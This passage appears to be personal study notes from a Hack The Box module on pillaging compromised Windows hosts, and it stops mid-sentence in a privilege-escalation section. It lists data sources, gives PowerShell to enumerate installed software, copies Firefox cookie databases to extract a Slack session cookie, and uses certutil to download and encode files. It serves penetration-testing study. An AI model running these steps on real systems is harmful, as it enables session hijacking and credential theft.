Pillaging is the technique to enumerate for information about our target or information that is useful to us.

Below are some of the sources from which we can obtain information from compromised systems:

- Installed applications
- Installed services
    - Websites
    - File Shares
    - Databases
    - Directory Services (such as Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Sensitive Data
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- User Information
    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
    - Roles and Privileges
    - Web Browsers
    - IM Clients

We can find installed application in these following 2 ways:
```
dir "C:\Program Files"
```

```
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

We can also extract cookies from firefox by using the following command:
```
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

Then, we use https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py on our local machine to extract cookies:

```
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```


The following Parts are skipped, however if we encounter the same item we it might be of our interest to visit https://academy.hackthebox.com/app/module/67/section/1637 again for more information: mRemoteNG, restic, slack

Transferring file with certutil:

We can transfer, encode and decode file with certutil:
```
PS C:\htb> certutil.exe -urlcache -split -f <url> <filename>
```

```
C:\htb> certutil -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
```

```
C:\htb> certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
```

Privilege Escalation with Always Install Elevated:

If Always Install Elevated is enabled, it means that every time when user install application, it will be run in elevated con